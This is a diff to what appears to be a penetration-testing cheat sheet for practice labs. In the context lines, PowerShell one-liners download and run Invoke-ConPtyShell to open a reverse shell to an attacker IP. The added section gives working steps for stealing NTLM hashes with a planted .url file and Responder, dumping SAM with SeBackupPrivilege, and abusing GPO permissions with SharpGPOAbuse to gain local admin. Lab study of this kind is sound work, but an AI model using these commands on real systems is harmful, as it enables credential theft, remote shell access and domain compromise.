@@ -1262,7 +1262,7 @@ rpcclient $>
 # Password created successful
 ```
 
-### WIndows conpty shell
+### Windows conpty shell
 - In windows we can interactive have reverse shell with autocomplete features using the [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
 - If you have the Windows recode code execution in the browser so we can get a fully interactive shell [Hutch PG Pracice](https://www.youtube.com/watch?v=yI6nN8o3YUY)
 
@@ -1274,6 +1274,29 @@ stty raw -echo; (stty size; cat) | nc -lvnp 80 #interactive shell with auto comp
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <KALI-IP> 3001
 powershell IEX(IWR http://192.168.45.227:8080/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.227 80 #target don't have NET access, share through kali box
 ```
+
+### SMB getting hash & Windows AD full permission GpoEditDeleteModifySecurity  
+- In windows smb port is open able insert a files, except that, their is clue to find with ldap, rpcclient, UDP snmp, ntp
+- In the SMB upload .url file to get the current logged in user hash on the target.
+- Vault Box PGPractice
+```powershell
+cat ashok.url 
+[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\192.168.45.214\%USERNAME%.icon
+IconIndex=1
+# cat file end, here Kali Linux IP, Username find windows username
+sudo responder -I tun0 -v # This case got anirudh hash
+whoami /all
+# It SeBackupPrivilege enabled dumped sam and system file got the admin hash but not able to login with winrm even tried with smb.
+Import-Module .\PowerView.ps1 # Create temp directory copy the powershell here
+Get-GPO -Name "Default Domain Policy" # Get the Id from the output then we can the user privileges with that is
+Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh # anirudh identified permission GpoEditDeleteModifySecurity
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+gpupdate /force # Must update the policies after changing
+net user anirudh # Boom user added into local admin group, loginwith impacket-psexec with anirudh user,you will admin privileges 
+``` 
 ---
 
 # Web Attacks
